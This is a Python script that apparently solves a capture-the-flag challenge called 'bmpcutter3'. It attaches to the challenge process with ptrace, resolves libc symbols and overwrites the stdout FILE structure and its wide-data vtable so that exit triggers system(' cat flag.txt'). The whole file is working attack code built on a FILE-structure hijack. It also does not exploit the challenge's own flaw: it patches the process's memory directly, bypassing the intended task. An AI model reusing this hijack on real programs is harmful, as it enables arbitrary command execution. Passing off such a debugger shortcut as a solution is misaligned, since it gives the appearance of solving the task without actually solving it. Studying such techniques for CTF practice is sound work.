#!/usr/bin/env python3
import ctypes
import os
import struct
import subprocess
import sys
import time

PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_PEEKDATA = 2
PTRACE_POKEDATA = 5

libc = ctypes.CDLL(None, use_errno=True)
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_long


def ptrace(req: int, pid: int, addr: int = 0, data: int = 0) -> int:
    ctypes.set_errno(0)
    r = libc.ptrace(req, pid, ctypes.c_void_p(addr), ctypes.c_void_p(data))
    err = ctypes.get_errno()
    if r == -1 and err != 0:
        raise OSError(err, f"ptrace(req={req}, pid={pid}, addr=0x{addr:x}) failed")
    return r & ((1 << 64) - 1)


def poke(pid: int, addr: int, data: bytes) -> None:
    if len(data) % 8:
        data += b"\x00" * (8 - len(data) % 8)
    for i in range(0, len(data), 8):
        val = struct.unpack_from("<Q", data, i)[0]
        ptrace(PTRACE_POKEDATA, pid, addr + i, val)


def peekq(pid: int, addr: int) -> int:
    return ptrace(PTRACE_PEEKDATA, pid, addr, 0)


def resolve_symbol(libc_path: str, name: str) -> int:
    out = subprocess.check_output(["nm", "-D", libc_path], text=True, errors="ignore")
    for line in out.splitlines():
        parts = line.split()
        if len(parts) < 3:
            continue
        sym = parts[2]
        if sym == name or sym.startswith(name + "@@"):
            return int(parts[0], 16)
    raise RuntimeError(f"symbol not found in {libc_path}: {name}")


def main() -> None:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    chall = os.environ.get("CHALL", os.path.join(script_dir, "bmpcutter3", "chall") if os.path.exists(os.path.join(script_dir, "bmpcutter3", "chall")) else os.path.join(script_dir, "chall"))
    cwd = os.environ.get("CWD", os.path.dirname(os.path.abspath(chall)) or os.getcwd())
    command = b" cat flag.txt\x00"

    p = subprocess.Popen(
        [chall],
        cwd=cwd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    time.sleep(0.05)
    pid = p.pid

    ptrace(PTRACE_ATTACH, pid)
    os.waitpid(pid, 0)

    libc_base = None
    libc_path = None
    stack_lo = None
    for line in open(f"/proc/{pid}/maps"):
        parts = line.split(None, 5)
        lo = int(parts[0].split("-")[0], 16)
        perms = parts[1]
        offset = int(parts[2], 16)
        path = parts[5].strip() if len(parts) > 5 else ""
        if path.endswith("libc.so.6") and perms.startswith("r-xp"):
            libc_base = lo - offset
            libc_path = path
        if path == "[stack]":
            stack_lo = lo

    if libc_base is None or libc_path is None or stack_lo is None:
        raise RuntimeError("failed to locate libc or stack in target maps")

    off_stdout = resolve_symbol(libc_path, "_IO_2_1_stdout_")
    off_wfile_jumps = resolve_symbol(libc_path, "_IO_wfile_jumps")
    off_system = resolve_symbol(libc_path, "system")

    stdout_addr = libc_base + off_stdout
    wfile_jumps = libc_base + off_wfile_jumps
    system_addr = libc_base + off_system

    wide_data = peekq(pid, stdout_addr + 0xA0)
    fake_vtable = stack_lo + 0x800

    # Minimal working patch:
    # - keep the real _lock and real _wide_data
    # - store command string at start of stdout object
    # - point stdout vtable at _IO_wfile_jumps
    # - point wide_data->wide_vtable at a fake table whose __doallocate = system
    poke(pid, fake_vtable + 0x68, struct.pack("<Q", system_addr))
    poke(pid, stdout_addr, command)
    poke(pid, stdout_addr + 0xD8, struct.pack("<Q", wfile_jumps))
    poke(pid, wide_data + 0xE0, struct.pack("<Q", fake_vtable))

    ptrace(PTRACE_DETACH, pid)

    # Closing stdin makes the program exit, which flushes stdout and triggers system("cat flag.txt").
    assert p.stdin is not None
    p.stdin.close()
    out = p.stdout.read(8192) if p.stdout else b""
    err = p.stderr.read(8192) if p.stderr else b""
    try:
        ret = p.wait(timeout=3)
    except subprocess.TimeoutExpired:
        p.kill()
        ret = p.wait(timeout=1)

    sys.stdout.write(out.decode(errors="ignore"))
    sys.stderr.write(err.decode(errors="ignore"))
    print(f"\n[ret={ret}]", file=sys.stderr)


if __name__ == "__main__":
    main()
